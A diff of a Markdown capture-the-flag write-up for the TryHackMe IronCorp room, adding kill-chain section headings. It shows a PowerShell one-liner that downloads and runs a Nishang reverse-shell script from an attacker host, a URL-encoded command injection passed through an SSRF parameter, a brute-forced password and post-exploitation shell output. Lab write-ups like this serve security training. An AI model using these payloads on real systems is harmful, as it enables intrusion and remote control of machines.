@@ -15,7 +15,7 @@ Access it <a href=https://tryhackme.com/room/ironcorp">here</a>.<br>
 | **Cyber Kill<br>Chain Phase** | **Tools**                                                                                          | **Actions<br>**                                                                                                     | **MITRE ATT&CK<br>Technique**                          |
 |:--------------------------|:--------------------------------------------------------------------------------------------------------|:--------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------|
 |Reconnaissance<br><br><br><br><br>|<p>- `dig`, `nmap`, `rustscan`, `dirb`<br><br><br>- `Burp Suite` +`FoxyProxy`<br><br></p>|<p>- Domain enumeration, port scanning, content discovery on ports 8080 and 11025<br><br>- Intercepted and inspected HTTP traffic to understand application behavior</p>|<p>- File and Directory Discovery, <a href="https://attack.mitre.org/techniques/T1083/">T1083</a><br><br><br>- Network Sniffing, <a href="https://attack.mitre.org/techniques/T1040/">T1040</a><br><br></p>|
-|Weaponization<br><br>    |- `Burp Suite` Repeater<br><br>                                                   |- Crafted malicious HTTP GET payload<br><br> |- Exploitation for Client Execution, <a href="https://attack.mitre.org/techniques/T1203/">T1203</a><br>  |
+|Weaponization<br><br>    |- `Burp Suite` Repeater<br><br>|- Crafted malicious HTTP GET payload<br><br>|- Exploitation for Client Execution, <a href="https://attack.mitre.org/techniques/T1203/">T1203</a><br>|
 |Delivery<br><br>         |- `Burp Suite` +`FoxyProxy`<br><br>                                                  |- Delivered payload via vulnerable web parameter (`name.php?name=...`)|- Command and Scripting Interpreter: PowerShell, <a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>|
 |Exploitation<br><br><br><br><br>     |- `Burp Suite` Repeater<br><br>-`hydra` + `rockyou.txt`<br><br>-PowerShell (`whoami`)<br>                        |- Triggered PowerShell reverse shell<br><br>- Brute-forced password for `admin` account<br><br>- Identified current user context (`nt authority\system`)<br>|- Exploitation for Client Execution, <a href="https://attack.mitre.org/techniques/T1203/">T1203</a><br>- Password Guessing , <a href="https://attack.mitre.org/techniques/T1110/001/">T1110.001</a><br>- System Information Discovery,  <a href="https://attack.mitre.org/techniques/T1082/">T1082</a>|
 |Installation<br><br>    |- PowerShell, HTTP reverse shell<br><br>                                          |- Established shell access on target system<br><br>          |- Command and Scripting Interpreter: PowerShell, <a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>|
@@ -386,6 +386,7 @@ PORT      STATE SERVICE       REASON  VERSION
 
 <br>
 <br>
+<h1 align="center">Exploitation</h1>
 <h3 align="center">T1110.001 – Password Guessing</h3>
 <p align= "center">admin: password123</p>
 
@@ -464,8 +465,6 @@ Content-Type: text/html; charset=UTF-8
 </html>
 ```
 
-<h1 align="center">Reconnaissance</h1>
-
 <h3 align="center">Search: <em>internal.ironcorp.me:11025</em></h3>
 
 <img width="1128" height="222" alt="image" src="https://github.com/user-attachments/assets/a81dba2d-b3f4-457d-b3ac-9b637bbd1356" />
@@ -511,14 +510,11 @@ Content-Type: text/html; charset=UTF-8
 
 <br>
 <br>
-
+<h1 align="center">Weaponization</h1>
 <h3 align="center">Invoke-PowerShellTcp</h3>
 <p>
 
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
-
-<br>
-
 
 ```bash
 powershell iex (New-Object Net.WebClient).DownloadString('http://xx.xxx.xxx.xxx:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress xx.xxx.xxx.xxx -Port 9001
@@ -528,10 +524,13 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://xx.xxx.xxx.xxx:
 %25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31
 ```
 
+<h1 align="center">Delivery</h1>
 
 ```bash
 http://admin.ironcorp.me:11025/?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dhello%7C%2525%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38...30%25%33%31#
 ```
+
+<h1 align="center">Exploitation, Installation, Command & Control (C2)</h1>
 
 <img width="1118" height="462" alt="image" src="https://github.com/user-attachments/assets/0d593bd2-aee5-43b1-a898-f9375e7ba2d6" />
 
@@ -580,6 +579,9 @@ d-r---        4/12/2020   1:27 AM                Videos
 
 
 PS C:\Users\Administrator> cd Desktop
+```
+
+```bash
 PS C:\Users\Administrator\Desktop> dir
 
 
@@ -589,19 +591,22 @@ PS C:\Users\Administrator\Desktop> dir
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
 -a----        3/28/2020  12:39 PM             37 user.txt                      
+```
 
+<h1 align="center">Actions on Objectives</h1>
 
+```bash
 PS C:\Users\Administrator\Desktop> type user.txt
 thm{********************************}
 ```
 
-<br>
-<br>
-
-
 ```bash
 PS C:\users\Equinox\Desktop> dir
 ```
+
+<br>
+<br>
+<h1 align="center">Exploitation, Installation, Command & Control (C2)</h1>
 
 ```bash
 PS C:\users\Equinox\Desktop> dir -force
@@ -610,9 +615,13 @@ PS C:\users\Equinox\Desktop> dir -force
     Directory: C:\users\Equinox\Desktop
 ```
 
+<br>
+
 ```bash
 PS C:\users\admin> ls -force
 ```
+
+<br>
 
 ```bash
 PS C:\Users\admin> dir : Access to the path 'C:\Users\admin' is denied.
@@ -629,6 +638,8 @@ At line:1 char:1
 
 <br>
 <br>
+
+<h1 align="center">Actions on Objectives</h1>
 
 <img width="1123" height="446" alt="image" src="https://github.com/user-attachments/assets/8819a5aa-3c12-4119-aaff-0fee597c0340" />
 
